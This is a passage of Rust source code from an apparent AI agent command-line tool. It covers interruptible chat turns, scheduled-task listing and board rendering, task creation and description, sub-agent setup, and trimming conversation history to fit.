                    tool_context.interrupt = Some(ctrl_c_rx.clone());
                    tool_context.file_versions = Some(file_versions.clone());
                    // A prompt task's turn can report its outcome.
                    let task_result_slot = Arc::new(Mutex::new(None));
                    if running_prompt_task.is_some() {
                        tool_context.result_slot = Some(task_result_slot.clone());
                    }

                    if is_injected {
                        maybe_summarize_proactively(
                            &mut active_agent,
                            &context_window,
                            &openai_opts,
                            &db,
                            &ctrl_c_rx,
                            &signal_handler_active,
                            &status_bar,
                            &chat_pb,
                        );
                        // Interruptible with Ctrl-C like a typed message: a
                        // scheduled task or an agent's message can run as long.
                        let injected_agent_name = active_agent.name.clone();
                        let result = request_with_summary_fallback(
                            &mut active_agent,
                            &openai_opts,
                            &db,
                            &ctrl_c_rx,
                            &signal_handler_active,
                            &status_bar,
                            &chat_pb,
                            |messages| {
                                execute_ai_request(
                                    messages,
                                    &turn_tools,
                                    &openai_opts,
                                    recorded_mode(ResponseMode::Complete, &events),
                                    &tool_context,
                                    Some(ctrl_c_rx.clone()),
                                    &signal_handler_active,
                                    &status_bar,
                                    &chat_pb,
                                    &injected_agent_name,
                                )
                            },
                        );
                        let task_turn = running_prompt_task.take();
                        let mut outcome = reported_task_outcome(result.as_ref(), &task_result_slot);
                        if matches!(&result, Err(e) if e.downcast_ref::<InterruptedError>().is_some())
                        {
                            outcome.result = "stopped".to_string();
                        }
                        record_turn_end(&events, &outcome);
                        if let (Some(task_id), Some(db)) = (task_turn, &db) {
                            if let Err(e) = db.finish_task(task_id, &session_id, &outcome) {
                                warn!("Couldn't record the outcome of task {}: {}", task_id, e);
                            }
                        }
                        match result {
                            Ok(response) => {
                                warn_if_truncated(&response, &chat_pb);
                                if let Some(prompt_tokens) =
                                    response.usage.as_ref().and_then(|u| u.prompt_tokens)
                                {
                                    active_agent.last_prompt_tokens = Some(prompt_tokens);
                                }
                                if let Some(usage) = response.turn_usage.as_ref() {
                                    session_usage
                                        .lock()
                                        .unwrap_or_else(|e| e.into_inner())
                                        .record(usage);
                                }
                                if let Some(ref choices) = response.choices {
                                    if let Some(content) =
                                        choices.first().and_then(|c| c.message.content.as_ref())
                                    {
                                        match display_graphics_mode(opts) {
                                            Some(DisplayGraphicsMode::Partial) => {
                                                println_agent_with_latex(
                                                    &chat_pb,
                                                    &active_agent.name,
                                                    content,
                                                    &status_bar,
                                                );
                                            }
                                            Some(DisplayGraphicsMode::Full) => {
                                                println_agent_full_latex(
                                                    &chat_pb,
                                                    &active_agent.name,
                                                    content,
                                                    &status_bar,
                                                );
                                            }
                                            None => {
                                                chat_pb.println_agent(&active_agent.name, content);
                                            }
                                        }
                                    }
                                }
                                active_agent.messages = response.history;
                                save_agent_history(&db, &active_agent);
                            }
                            Err(e) => {
                                if e.downcast_ref::<InterruptedError>().is_none() {
                                    chat_pb.println(&match task_turn {
                                        Some(task_id) => {
                                            format!(
                                                "Error running scheduled task #{}: {}",
                                                task_id, e
                                            )
                                        }
                                        None => format!("Error processing notification: {}", e),
                                    });
                                }
                            }
                        }
                    } else {
                        let printer_for_tool = chat_pb.clone();
                        let boxed_for_tool = tool_context.boxed.clone();
                        tool_context.println = Box::new(move |msg: &str| {
                            if boxed_for_tool.load(Ordering::Relaxed) {
                                printer_for_tool.println(&tool_box_prefix_lines(msg));
                            } else {
                                printer_for_tool.println(msg);
                            }
                        });

                        let agent_name = active_agent.name.clone();
                        // Holds the "Complete | Ns" line's text once the
                        // response itself finishes, printed further below
                        // instead of immediately - if --display-graphics=full
                        // still has rendering to do, printing "Complete"
                        // before that finished would make the turn look
                        // done while more of it is still coming.
                        let pending_complete_message = Arc::new(Mutex::new(None));
                        let graphics_mode = display_graphics_mode(opts);
                        // Only meaningfully used ("full" needs the whole
                        // reasoning text once the response is done, to
                        // render it too) - see create_response_mode.
                        let reasoning_accumulator = Arc::new(Mutex::new(String::new()));
                        maybe_summarize_proactively(
                            &mut active_agent,
                            &context_window,
                            &openai_opts,
                            &db,
                            &ctrl_c_rx,
                            &signal_handler_active,
                            &status_bar,
                            &chat_pb,
                        );
                        let result = request_with_summary_fallback(
                            &mut active_agent,
                            &openai_opts,
                            &db,
                            &ctrl_c_rx,
                            &signal_handler_active,
                            &status_bar,
                            &chat_pb,
                            |messages| {
                                let mode = recorded_mode(
                                    create_response_mode(
                                        chat_pb.clone(),
                                        status_bar.clone(),
                                        agent_name.clone(),
                                        pending_complete_message.clone(),
                                        graphics_mode,
                                        reasoning_accumulator.clone(),
                                        activity.clone(),
                                    ),
                                    &events,
                                );
                                status_bar.set_agent_status(
                                    &agent_name,
                                    "Waiting for response",
                                    true,
                                );
                                execute_ai_request(
                                    messages,
                                    &turn_tools,
                                    &openai_opts,
                                    mode,
                                    &tool_context,
                                    Some(ctrl_c_rx.clone()),
                                    &signal_handler_active,
                                    &status_bar,
                                    &chat_pb,
                                    &agent_name,
                                )
                            },
                        );
                        record_turn_end(&events, &prompt_task_outcome(result.as_ref()));
                        match result {
                            Ok(response) => {
                                warn_if_truncated(&response, &chat_pb);
                                if let Some(prompt_tokens) =
                                    response.usage.as_ref().and_then(|u| u.prompt_tokens)
                                {
                                    active_agent.last_prompt_tokens = Some(prompt_tokens);
                                }
                                if let Some(usage) = response.turn_usage.as_ref() {
                                    session_usage
                                        .lock()
                                        .unwrap_or_else(|e| e.into_inner())
                                        .record(usage);
                                }
                                // "partial" already rendered any LaTeX
                                // blocks inline as the response streamed -
                                // nothing left to do here for it. "full"
                                // never printed anything live at all (see
                                // create_response_mode); this is the first
                                // and only point its reasoning and answer
                                // actually reach the screen, as a rendered
                                // document or, failing that, as plain text.
                                if graphics_mode == Some(DisplayGraphicsMode::Full) {
                                    let reasoning_text = reasoning_accumulator
                                        .lock()
                                        .map(|guard| guard.clone())
                                        .unwrap_or_default();
                                    if !reasoning_text.trim().is_empty() {
                                        render_full_or_fallback(
                                            &chat_pb,
                                            &status_bar,
                                            &agent_name,
                                            "reasoning",
                                            &reasoning_text,
                                            Style::new().color256(244).italic(),
                                            latex_kitty::reasoning_text_color,
                                        );
                                    }
                                    if let Some(content) = response
                                        .choices
                                        .as_ref()
                                        .and_then(|c| c.first())
                                        .and_then(|c| c.message.content.as_deref())
                                    {
                                        render_full_or_fallback(
                                            &chat_pb,
                                            &status_bar,
                                            &agent_name,
                                            "response",
                                            content,
                                            Style::new().cyan(),
                                            latex_kitty::answer_text_color,
                                        );
                                    }
                                }
                                if let Some(message) = pending_complete_message
                                    .lock()
                                    .ok()
                                    .and_then(|mut guard| guard.take())
                                {
                                    chat_pb.println(&message);
                                }
                                active_agent.messages = response.history;
                                save_agent_history(&db, &active_agent);
                            }
                            Err(e) => {
                                if e.downcast_ref::<InterruptedError>().is_none() {
                                    chat_pb.println(&format!("Error: {}", e));
                                }
                                continue;
                            }
                        }
                    }
                }
                if let ChatCommand::Summarize = parse_chat_command(&line) {
                    let history = active_agent.messages.clone();
                    if let Err(e) = summarize_agent_history(
                        &mut active_agent,
                        &history,
                        false,
                        &openai_opts,
                        &db,
                        &ctrl_c_rx,
                        &signal_handler_active,
                        &status_bar,
                        &chat_pb,
                    ) {
                        if e.downcast_ref::<InterruptedError>().is_none() {
                            chat_pb.println(&format!("Error: {}", e));
                        }
                    }
                }
            }
        }
    }
}

// ModelInfo and ModelsApiResponse structs are removed from here.

fn gc_command(opts: &Opts) -> Result<(), Box<dyn Error>> {
    let db_path = opts
        .db_path
        .as_ref()
        .ok_or("No db_path configured. Set 'db_path' in your config file.")?;
    let conn = rusqlite::Connection::open(db_path)?;
    db::initialize_db(&conn)?;
    let db = LocalDb::new(Arc::new(Mutex::new(conn)));
    let removed = db.gc_agents()?;
    if removed.is_empty() {
        println!("No dormant agents to clean up.");
    } else {
        println!("Removed {} agent(s):", removed.len());
        for name in &removed {
            println!("  {}", name);
        }
    }
    Ok(())
}

/// A duration like `45s`, `30m`, `2h`, `3d` or `1w`.
fn parse_duration(text: &str) -> Option<chrono::Duration> {
    let text = text.trim();
    let unit = text.chars().last()?;
    let n: i64 = text[..text.len() - unit.len_utf8()].parse().ok()?;
    let seconds = match unit {
        's' => n,
        'm' => n * 60,
        'h' => n * 3600,
        'd' => n * 86_400,
        'w' => n * 7 * 86_400,
        _ => return None,
    };
    Some(chrono::Duration::seconds(seconds))
}

/// A point in time: RFC 3339, or `YYYY-MM-DD[ HH:MM]` in local time.
fn parse_datetime(text: &str) -> Option<Result<chrono::DateTime<chrono::Utc>, String>> {
    let text = text.trim();
    if let Ok(t) = chrono::DateTime::parse_from_rfc3339(text) {
        return Some(Ok(t.with_timezone(&chrono::Utc)));
    }
    let local = chrono::NaiveDateTime::parse_from_str(text, "%Y-%m-%d %H:%M")
        .or_else(|_| {
            chrono::NaiveDate::parse_from_str(text, "%Y-%m-%d")
                .map(|d| d.and_hms_opt(0, 0, 0).unwrap_or_default())
        })
        .ok()?;
    Some(
        local
            .and_local_timezone(chrono::Local)
            .earliest()
            .map(|t| t.with_timezone(&chrono::Utc))
            .ok_or_else(|| format!("'{}' doesn't exist in the local time zone", text)),
    )
}

/// `--since`: a duration back from `now` (`45s`, `30m`, `2h`, `3d`, `1w`),
/// or a date/time - RFC 3339, or `YYYY-MM-DD[ HH:MM]` in local time.
fn parse_since(
    text: &str,
    now: chrono::DateTime<chrono::Utc>,
) -> Result<chrono::DateTime<chrono::Utc>, String> {
    if let Some(duration) = parse_duration(text) {
        return Ok(now - duration);
    }
    parse_datetime(text).unwrap_or_else(|| {
        Err(format!(
            "can't read --since '{}': use a duration like 30m, 2h, 3d, 1w, or a date like 2026-10-01",
            text.trim()
        ))
    })
}

/// `t` relative to `now`, compactly: "in 5m", "3h ago", "now"; a date
/// once it's more than a week away.
fn format_relative(t: chrono::DateTime<chrono::Utc>, now: chrono::DateTime<chrono::Utc>) -> String {
    let seconds = (t - now).num_seconds();
    let magnitude = seconds.unsigned_abs();
    let amount = match magnitude {
        0..=4 => return "now".to_string(),
        5..=59 => format!("{}s", magnitude),
        60..=3599 => format!("{}m", magnitude / 60),
        3600..=86_399 => format!("{}h", magnitude / 3600),
        86_400..=604_799 => format!("{}d", magnitude / 86_400),
        _ => {
            return t
                .with_timezone(&chrono::Local)
                .format("%Y-%m-%d")
                .to_string();
        }
    };
    if seconds > 0 {
        format!("in {}", amount)
    } else {
        format!("{} ago", amount)
    }
}

/// When a task last did anything: created, started or finished a run.
fn task_activity(task: &db::TaskRow) -> Option<chrono::DateTime<chrono::Utc>> {
    [
        Some(&task.created_at),
        task.started_at.as_ref(),
        task.last_run_at.as_ref(),
    ]
    .into_iter()
    .flatten()
    .filter_map(|t| db::parse_db_time(t))
    .max()
}

/// The tasks `faber tasks` shows: active since `since`, most recent first,
/// at most `last` of them.
fn select_tasks(
    mut tasks: Vec<db::TaskRow>,
    since: Option<chrono::DateTime<chrono::Utc>>,
    last: Option<usize>,
) -> Vec<db::TaskRow> {
    if let Some(since) = since {
        tasks.retain(|t| task_activity(t).is_some_and(|a| a >= since));
    }
    tasks.sort_by(|a, b| {
        task_activity(b)
            .cmp(&task_activity(a))
            .then(b.id.cmp(&a.id))
    });
    if let Some(last) = last {
        tasks.truncate(last);
    }
    tasks
}

/// The first line of `text`, at most `max` characters.
fn first_line(text: &str, max: usize) -> String {
    let line = text
        .lines()
        .find(|l| !l.trim().is_empty())
        .unwrap_or("")
        .trim();
    if line.chars().count() > max {
        format!("{}…", line.chars().take(max - 1).collect::<String>())
    } else {
        line.to_string()
    }
}

/// One row of the `faber tasks` table.
/// Where a task runs, for showing: "profile fast", an agent's name, "any
/// agent" for an unbound prompt task, or "-" for a tool task (any
/// session's scheduler runs those).
fn task_target(task: &db::TaskRow) -> String {
    match (&task.profile, &task.agent_name, task.kind.as_str()) {
        (Some(profile), _, _) => format!("profile {}", profile),
        (None, Some(agent), _) => agent.clone(),
        (None, None, db::TaskKind::PROMPT) => "any agent".to_string(),
        (None, None, _) => "-".to_string(),
    }
}

fn format_task_ids(ids: &[i64]) -> String {
    ids.iter()
        .map(|id| format!("#{}", id))
        .collect::<Vec<_>>()
        .join(", ")
}

fn task_table_row(
    task: &db::TaskRow,
    blocked: &HashMap<i64, Vec<i64>>,
    now: chrono::DateTime<chrono::Utc>,
) -> Row {
    let when = |t: &Option<String>| {
        t.as_deref()
            .and_then(db::parse_db_time)
            .map(|t| format_relative(t, now))
            .unwrap_or_else(|| "-".to_string())
    };
    let schedule = match (&task.cron_expression, &task.run_at) {
        (Some(cron), _) => cron.clone(),
        (None, Some(_)) => "once".to_string(),
        (None, None) => "-".to_string(),
    };
    let status = match task.status.as_str() {
        db::TaskStatus::RUNNING => Cell::new(&format!(
            "running ({})",
            when(&task.started_at).trim_end_matches(" ago")
        ))
        .style_spec("Fy"),
        status => Cell::new(status),
    };
    let due = task
        .next_run_at
        .as_deref()
        .and_then(db::parse_db_time)
        .is_some_and(|t| t <= now);
    let next = if task.status == db::TaskStatus::HELD {
        if due {
            "when released".to_string()
        } else {
            format!("{} (if released)", when(&task.next_run_at))
        }
    } else if task.status != db::TaskStatus::SCHEDULED {
        "-".to_string()
    } else if let Some(unmet) = blocked.get(&task.id) {
        format!("after {}", format_task_ids(unmet))
    } else if due && task.profile.is_some() {
        // Only a worker that has the profile picks these up.
        "waiting for a worker".to_string()
    } else if due && task.kind == db::TaskKind::PROMPT {
        // Only a chat session waiting at its prompt picks these up.
        "waiting for an agent".to_string()
    } else {
        when(&task.next_run_at)
    };
    let result = match task.last_outcome.as_deref() {
        Some(outcome) => {
            let mark = if outcome == "succeeded" { "✓" } else { "✗" };
            let code = task
                .last_exit_code
                .map(|c| format!(" {}", c))
                .unwrap_or_default();
            let text = first_line(task.last_result.as_deref().unwrap_or(""), 40);
            Cell::new(format!("{}{} {}", mark, code, text).trim_end())
                .style_spec(if outcome == "succeeded" { "Fg" } else { "Fr" })
        }
        None => Cell::new("-"),
    };
    let runs = match task.max_runs {
        Some(max) => format!("{}/{}", task.run_count, max),
        None => task.run_count.to_string(),
    };
    Row::new(vec![
        Cell::new(&task.id.to_string()),
        Cell::new(&task.name),
        Cell::new(&task_target(task)),
        Cell::new(&task.kind),
        Cell::new(&schedule),
        status,
        Cell::new(&next),
        Cell::new(&when(&task.last_run_at)),
        Cell::new(&runs),
        result,
    ])
}

/// Most cards shown in one board column; the rest are counted.
const BOARD_MAX_CARDS: usize = 10;

/// The board column a task belongs in.
fn board_column(
    task: &db::TaskRow,
    blocked: &HashMap<i64, Vec<i64>>,
    now: chrono::DateTime<chrono::Utc>,
) -> usize {
    let due = task
        .next_run_at
        .as_deref()
        .and_then(db::parse_db_time)
        .is_some_and(|t| t <= now);
    match task.status.as_str() {
        db::TaskStatus::RUNNING => 2,
        db::TaskStatus::DONE => 3,
        db::TaskStatus::SCHEDULED
            if due && task.kind == db::TaskKind::PROMPT && !blocked.contains_key(&task.id) =>
        {
            1
        }
        _ => 0,
    }
}

/// The text lines of a task's card (without its frame), with `ok`/`bad`/
/// `dim`/`busy` styling for the parts that carry state.
fn board_card_lines(
    task: &db::TaskRow,
    blocked: &HashMap<i64, Vec<i64>>,
    now: chrono::DateTime<chrono::Utc>,
    styles: &BoardStyles,
) -> Vec<String> {
    let ago = |t: &Option<String>| {
        t.as_deref()
            .and_then(db::parse_db_time)
            .map(|t| format_relative(t, now))
            .unwrap_or_else(|| "-".to_string())
    };
    let who = task_target(task);
    let mut lines = vec![format!("#{} {}", task.id, task.name)];
    match task.status.as_str() {
        db::TaskStatus::DONE => {
            let mark = match task.last_outcome.as_deref() {
                Some("succeeded") => styles.ok.apply_to("✓").to_string(),
                Some(_) => styles.bad.apply_to("✗").to_string(),
                None => "-".to_string(),
            };
            lines.push(format!("{} {}", mark, ago(&task.last_run_at)));
            if let Some(result) = task.last_result.as_deref().filter(|r| !r.trim().is_empty()) {
                lines.push(styles.dim.apply_to(first_line(result, 200)).to_string());
            }
        }
        db::TaskStatus::RUNNING => {
            lines.push(format!("{} · {}", task.kind, who));
            let since = ago(&task.started_at);
            lines.push(
                styles
                    .busy
                    .apply_to(format!("for {}", since.trim_end_matches(" ago")))
                    .to_string(),
            );
        }
        status => {
            let schedule = task
                .cron_expression
                .clone()
                .unwrap_or_else(|| "once".to_string());
            lines.push(format!("{} · {}", task.kind, schedule));
            if status == db::TaskStatus::DISABLED {
                lines.push(styles.dim.apply_to("⏸ disabled").to_string());
            } else if status == db::TaskStatus::HELD {
                lines.push(styles.busy.apply_to("✋ on hold").to_string());
            } else if let Some(unmet) = blocked.get(&task.id) {
                lines.push(
                    styles
                        .dim
                        .apply_to(format!("after {}", format_task_ids(unmet)))
                        .to_string(),
                );
            } else if board_column(task, blocked, now) == 1 {
                lines.push(format!("due {} · for {}", ago(&task.next_run_at), who));
            } else {
                lines.push(ago(&task.next_run_at));
            }
        }
    }
    lines
}

/// Styling for the board; all plain when output isn't a terminal.
struct BoardStyles {
    ok: Style,
    bad: Style,
    dim: Style,
    busy: Style,
}

impl BoardStyles {
    fn new(color: bool) -> Self {
        Self {
            ok: Style::new().green().force_styling(color),
            bad: Style::new().red().force_styling(color),
            dim: Style::new().color256(244).force_styling(color),
            busy: Style::new().yellow().force_styling(color),
        }
    }
}

/// Pads (or cuts) `text` to exactly `width` columns of the screen,
/// whatever escape codes or wide characters it contains.
fn fit(text: &str, width: usize) -> String {
    let cut = console::truncate_str(text, width, "…");
    let pad = width.saturating_sub(console::measure_text_width(&cut));
    format!("{}{}", cut, " ".repeat(pad))
}

/// `tasks` as a board: one column per state - scheduled (including
/// disabled), waiting for an agent, running, done - with a card per task,
/// laid out to fit `width` screen columns.
fn render_board(
    tasks: &[db::TaskRow],
    blocked: &HashMap<i64, Vec<i64>>,
    now: chrono::DateTime<chrono::Utc>,
    width: usize,
    color: bool,
) -> String {
    const GAP: usize = 2;
    let styles = BoardStyles::new(color);
    let col_width = (width.saturating_sub(3 * GAP) / 4).clamp(20, 48);
    let inner = col_width - 4;
    let titles = ["SCHEDULED", "WAITING", "RUNNING", "DONE"];

    let mut columns: Vec<Vec<String>> = Vec::new();
    for (index, title) in titles.iter().enumerate() {
        let cards: Vec<&db::TaskRow> = tasks
            .iter()
            .filter(|t| board_column(t, blocked, now) == index)
            .collect();
        let mut lines = vec![
            fit(&format!("{} ({})", title, cards.len()), col_width),
            " ".repeat(col_width),
        ];
        for task in cards.iter().take(BOARD_MAX_CARDS) {
            lines.push(format!("┌{}┐", "─".repeat(col_width - 2)));
            for line in board_card_lines(task, blocked, now, &styles) {
                lines.push(format!("│ {} │", fit(&line, inner)));
            }
            lines.push(format!("└{}┘", "─".repeat(col_width - 2)));
        }
        if cards.len() > BOARD_MAX_CARDS {
            lines.push(fit(
                &format!("+{} more", cards.len() - BOARD_MAX_CARDS),
                col_width,
            ));
        }
        columns.push(lines);
    }

    let rows = columns.iter().map(Vec::len).max().unwrap_or(0);
    let blank = " ".repeat(col_width);
    let mut out = String::new();
    for row in 0..rows {
        let cells: Vec<&str> = columns
            .iter()
            .map(|c| c.get(row).map(String::as_str).unwrap_or(&blank))
            .collect();
        out.push_str(cells.join(&" ".repeat(GAP)).trim_end());
        out.push('\n');
    }
    out
}

/// Prints the tasks `select_tasks` picks as a table, as of `now`.
fn print_tasks_table(
    db: &dyn DbBackend,
    since: Option<&str>,
    last: Option<usize>,
    agent: Option<&str>,
    profile: Option<&str>,
    board: bool,
    now: chrono::DateTime<chrono::Utc>,
) -> Result<(), Box<dyn Error>> {
    let since = since.map(|s| parse_since(s, now)).transpose()?;
    let all = db.list_tasks(None)?;
    let blocked = db::unmet_dependencies(&all);
    let mut tasks = db.list_tasks(agent)?;
    if let Some(profile) = profile {
        tasks.retain(|t| t.profile.as_deref() == Some(profile));
    }
    let tasks = select_tasks(tasks, since, last);
    if board {
        let term = console::Term::stdout();
        let width = if term.is_term() {
            term.size().1 as usize
        } else {
            120
        };
        print!(
            "{}",
            render_board(&tasks, &blocked, now, width, term.is_term())
        );
        return Ok(());
    }
    if tasks.is_empty() {
        println!("No tasks.");
        return Ok(());
    }
    let mut table = Table::new();
    table.set_format(*format::consts::FORMAT_NO_BORDER_LINE_SEPARATOR);
    table.set_titles(Row::new(
        [
            "ID",
            "Name",
            "Runs on",
            "Kind",
            "Schedule",
            "Status",
            "Next run",
            "Last run",
            "Runs",
            "Last result",
        ]
        .iter()
        .map(|t| Cell::new(t))
        .collect(),
    ));
    for task in &tasks {
        table.add_row(task_table_row(task, &blocked, now));
    }
    table.printstd();
    Ok(())
}

/// The task `faber tasks add` describes, as of `now`.
fn new_task_from_cli(
    action: &TasksAction,
    now: chrono::DateTime<chrono::Utc>,
) -> Result<db::NewTask, String> {
    let TasksAction::Add {
        text,
        after,
        at,
        cron,
        max_runs,
        agent,
        profile,
        tool,
        name,
        hold,
        depends_on,
        cwd,
    } = action
    else {
        return Err("not a `tasks add` command".to_string());
    };
    if text.trim().is_empty() {
        return Err("the task's text is empty".to_string());
    }
    if *tool {
        let call: serde_json::Value = serde_json::from_str(text)
            .map_err(|e| format!("--tool expects a JSON tool call: {}", e))?;
        if call
            .get("tool")
            .and_then(|t| t.as_str())
            .is_none_or(str::is_empty)
        {
            return Err(r#"--tool expects {"tool": "<name>", "arguments": {...}}"#.to_string());
        }
    }
    let schedule = match (after, at, cron) {
        (_, _, Some(expression)) => db::TaskSchedule::Cron {
            expression: expression.clone(),
            max_runs: *max_runs,
        },
        (Some(after), _, _) => {
            let duration = parse_duration(after)
                .ok_or_else(|| format!("can't read --in '{}': use e.g. 30s, 10m, 2h, 1d", after))?;
            db::TaskSchedule::Once {
                at: (now + duration).to_rfc3339(),
            }
        }
        (None, Some(at), None) => db::TaskSchedule::Once {
            at: parse_datetime(at)
                .unwrap_or_else(|| {
                    Err(format!(
                        "can't read --at '{}': use e.g. \"2026-10-03 08:00\"",
                        at
                    ))
                })?
                .to_rfc3339(),
        },
        (None, None, None) => db::TaskSchedule::Once {
            at: now.to_rfc3339(),
        },
    };
    let name = match name {
        Some(name) => name.clone(),
        None if *tool => serde_json::from_str::<serde_json::Value>(text)
            .ok()
            .and_then(|c| c["tool"].as_str().map(String::from))
            .unwrap_or_default(),
        None => first_line(text, 40),
    };
    Ok(db::NewTask {
        name,
        description: String::new(),
        kind: if *tool {
            db::TaskKind::TOOL
        } else {
            db::TaskKind::PROMPT
        }
        .to_string(),
        command: text.clone(),
        agent_name: agent.clone(),
        schedule,
        held: *hold,
        depends_on: depends_on.clone(),
        profile: profile.clone(),
        run_safe: false,
        cwd: cwd
            .as_deref()
            .map(|dir| resolve_cwd(&std::env::current_dir().map_err(|e| e.to_string())?, dir))
            .transpose()?,
    })
}

/// Everything about `task`, for `faber tasks show`: one labelled line per
/// field, times both absolute (local) and relative to `now`, and the full
/// command and last result indented below.
fn describe_task(
    task: &db::TaskRow,
    dependencies: &[String],
    now: chrono::DateTime<chrono::Utc>,
) -> String {
    let time = |t: &Option<String>| match t.as_deref() {
        None => "-".to_string(),
        Some(text) => match db::parse_db_time(text) {
            Some(t) => format!(
                "{} ({})",
                t.with_timezone(&chrono::Local).format("%Y-%m-%d %H:%M:%S"),
                format_relative(t, now)
            ),
            None => text.to_string(),
        },
    };
    let schedule = match (&task.cron_expression, &task.run_at) {
        (Some(cron), _) => format!("cron \"{}\"", cron),
        (None, Some(at)) => format!("once, at {}", time(&Some(at.clone()))),
        (None, None) => "-".to_string(),
    };
    let runs = match task.max_runs {
        Some(max) => format!("{} of at most {}", task.run_count, max),
        None => task.run_count.to_string(),
    };
    let who = task_target(task);
    let outcome = match task.last_outcome.as_deref() {
        Some(outcome) => match task.last_exit_code {
            Some(code) => format!("{} (exit code {})", outcome, code),
            None => outcome.to_string(),
        },
        None => "-".to_string(),
    };
    let fields: Vec<(&str, String)> = vec![
        ("Name", task.name.clone()),
        ("Kind", task.kind.clone()),
        ("Status", task.status.clone()),
        ("Runs on", who),
        ("Schedule", schedule),
        (
            "Next run",
            match task.status.as_str() {
                db::TaskStatus::SCHEDULED => time(&task.next_run_at),
                db::TaskStatus::HELD => format!("{}, once released", time(&task.next_run_at)),
                _ => "-".to_string(),
            },
        ),
        ("Runs", runs),
        ("Created", time(&Some(task.created_at.clone()))),
        ("Started", time(&task.started_at)),
        ("Last run", time(&task.last_run_at)),
        (
            "Claimed by",
            task.claimed_by.clone().unwrap_or_else(|| "-".to_string()),
        ),
        ("Last outcome", outcome),
        (
            "Depends on",
            if dependencies.is_empty() {
                "-".to_string()
            } else {
                dependencies.join(", ")
            },
        ),
        (
            "Runs in",
            task.cwd
                .clone()
                .unwrap_or_else(|| "where its agent works".to_string()),
        ),
    ];
    let indent = |text: &str| {
        text.lines()
            .map(|l| format!("    {}", l))
            .collect::<Vec<_>>()
            .join("\n")
    };
    let mut out = format!("Task #{}\n", task.id);
    for (label, value) in fields {
        out.push_str(&format!("  {:<14}{}\n", format!("{}:", label), value));
    }
    if !task.description.trim().is_empty() {
        out.push_str(&format!(
            "\nDescription:\n{}\n",
            indent(task.description.trim())
        ));
    }
    out.push_str(&format!("\nCommand:\n{}\n", indent(task.command.trim())));
    if let Some(result) = task.last_result.as_deref().filter(|r| !r.trim().is_empty()) {
        out.push_str(&format!("\nLast result:\n{}\n", indent(result.trim())));
    }
    out
}

/// The agent a profile task runs on: `<profile>-<task id>`, made from the
/// profile (again, for a later run of a cron task) as a sub-agent of the
/// worker `parent`, and claimed by its session.
fn profile_task_agent(
    task: &db::TaskRow,
    profile: &str,
    parent: &str,
    unsafe_tools: bool,
    db: &dyn DbBackend,
    session_id: &str,
    profiles: &Profiles,
) -> Result<String, Box<dyn Error>> {
    let settings = find_profile(profiles, profile)?;
    let name = format!("{}-{}", profile, task.id);
    check_name_free_for(db, &name, parent)?;
    apply_profile(db, &name, profile, settings)?;
    db.set_agent_data(&name, db::ONE_JOB_KEY, "task")?;
    set_agent_unsafe(db, &name, unsafe_tools)?;
    // It works where the task says, or else where the worker does.
    let cwd = task.cwd.clone().or(db.get_agent_config(parent)?.cwd);
    set_agent_cwd(db, &name, cwd)?;
    db.set_agent_parent(&name, Some(parent))?;
    if !db.claim_agent(&name, session_id)? {
        return Err(format!("agent '{}' is in use by another session", name).into());
    }
    Ok(name)
}

/// The agent a fan_out worker runs as, `name`, made for it as a sub-agent
/// of `caller` - with its unsafe tools, or not, and directory - and
/// claimed by the session.
pub(crate) fn make_worker_agent(
    db: &dyn DbBackend,
    name: &str,
    caller: &str,
    ctx: &ToolContext,
    session_id: &str,
) -> Result<(), Box<dyn Error>> {
    check_name_free_for(db, name, caller)?;
    if db.get_agent(name)?.is_none() {
        db.create_agent(name, &format!("fan_out worker of {}", caller))?;
    }
    db.set_agent_data(name, db::ONE_JOB_KEY, "fan_out")?;
    db.set_agent_parent(name, Some(caller))?;
    let mut config = db.get_agent_config(name)?;
    config.unsafe_tools = Some(ctx.unsafe_tools);
    config.cwd = ctx.cwd.as_ref().and_then(|c| c.to_str()).map(String::from);
    db.set_agent_config(name, &config)?;
    if !db.claim_agent(name, session_id)? {
        return Err(format!("agent '{}' is in use by another session", name).into());
    }
    Ok(())
}

/// How much of an agent's conversation, in characters, a task carrying it
/// on keeps when the model's context window isn't known.
const DEFAULT_HISTORY_CHARS: usize = 200_000;

/// `history`, cut to about `budget` characters to carry on with: its
/// leading system messages, then as much of the end as fits, starting at
/// a user message - never halfway through a tool call and its result.
fn fit_history(history: Vec<Message>, budget: usize) -> Vec<Message> {
    let size = |m: &Message| serde_json::to_string(m).map_or(0, |s| s.len());
    let system = history.iter().take_while(|m| m.role == "system").count();
    let mut kept = 0;
    let mut start = history.len();
    let mut used: usize = history[..system].iter().map(size).sum();
    while start > system && used + size(&history[start - 1]) <= budget {
        start -= 1;
        used += size(&history[start]);
        kept += 1;
    }
    if kept == history.len() - system {
        return history;
    }
    // Begin where a turn does.
    while start < history.len() && history[start].role != "user" {
        start += 1;
    }
    let mut fitted: Vec<Message> = history[..system].to_vec();
    fitted.push(make_message(
        "system",
        "(The start of this conversation was left out, to fit.)".to_string(),
    ));
    fitted.extend_from_slice(&history[start..]);
    fitted
}

/// Tells an agent it's the one running task `id` - or, seeing the task
/// "running" in task_list, it may go looking for who runs it, and wait.
pub(crate) fn running_task_note(id: i64) -> Message {
    make_message(
        "system",
        format!(
            "You are running task #{} now: it's yours to do. In task_list it shows as running, \
             claimed by your own session - that's you. Do the work (start sub-agents or fan_out \
             if it helps), then end your turn with the result.",
            id
        ),
    )
}

/// Tells an agent where it works - otherwise models assume, or make up,
/// a directory, and hand made-up paths to the agents they start.
pub(crate) fn working_directory_note(cwd: &std::path::Path) -> Message {
    make_message(
        "system",
        format!(
            "You work in the directory {}. Relative paths in your tools (read_file, glob, \
             grep, run_command, ...) are relative to it, and so are those of \
             the agents you start, which work there too: give them relative paths.",
            cwd.display()
        ),
    )
}

/// The agent a task no one in particular was given runs on: `task-<id>`,
/// a sub-agent of the worker `parent` with its settings, claimed by its
/// session - so the worker can run any number of them at once, each with
/// its own conversation.
fn own_task_agent(
    task: &db::TaskRow,
    parent: &str,
    unsafe_tools: bool,
    db: &dyn DbBackend,
    session_id: &str,
) -> Result<String, Box<dyn Error>> {
    let name = format!("task-{}", task.id);
    check_name_free_for(db, &name, parent)?;
    if db.get_agent(&name)?.is_none() {
        db.create_agent(&name, &format!("Runs task #{}", task.id))?;
    }
    db.set_agent_data(&name, db::ONE_JOB_KEY, "task")?;
    let mut config = db.get_agent_config(parent)?;
    config.unsafe_tools = Some(unsafe_tools);
    if task.cwd.is_some() {
        config.cwd = task.cwd.clone();
    }
    db.set_agent_config(&name, &config)?;
    db.set_agent_parent(&name, Some(parent))?;
    if !db.claim_agent(&name, session_id)? {
        return Err(format!("agent '{}' is in use by another session", name).into());
    }
    Ok(name)
}

